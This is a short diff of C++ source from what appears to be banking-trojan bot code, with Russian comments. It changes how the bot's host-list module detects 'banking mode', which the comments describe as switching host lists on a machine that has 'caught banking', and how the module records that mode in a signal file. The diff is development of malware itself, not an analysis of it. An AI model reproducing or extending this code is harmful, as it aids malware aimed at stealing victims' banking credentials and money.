@@ -10,6 +10,7 @@
 #include "Plugins.h"
 #include "BotHosts.h"
 #include "Utils.h"
+#include "Config.h";
 
 //---------------------------------------------------------------------------
 
@@ -488,17 +489,19 @@ bool Hosts::UpdateHosts(PCHAR Args)
 		// Загружаем плагин
 		if (STR::IsEmpty(Args))
 		{
-			// Плагин не указан оопределяем нужный
-			PCHAR Signal = HostsGetBankingSignalFile();
+			// Плагин не указан определяем нужный
+//			PCHAR Signal = HostsGetBankingSignalFile();
 
-			if (FileExistsA(Signal))
+//			if (FileExistsA(Signal))
+
+			if (IsBankingMode())
 				Args = (PCHAR)HostsBankingMode;
             else
 				Args = (PCHAR)HostsNoBankingMode;
 
             IgnoreWeight = true;
 
-			STR::Free(Signal);
+//			STR::Free(Signal);
         }
 
 
@@ -639,21 +642,13 @@ void Hosts::SetBankingMode()
 	//  Функция включает использования хостов для системы которая
 	//  поймала банкинг
 
-	DWORD Flag = 1;
 	bool Update = false;
 
 	PCHAR FileName = HostsGetBankingSignalFile();
 
-	if (!FileExistsA(FileName))
-	{
-		Update = true;
-		File::WriteBufferA(FileName, &Flag, sizeof(Flag));
-    }
+	File::WriteBufferA(FileName, NULL, 0);
 
 	STR::Free(FileName);
-
-	if (Update)
-	    StartThread(BankingModeApdateHostsThread, NULL);
 }
 //---------------------------------------------------------------------------
 
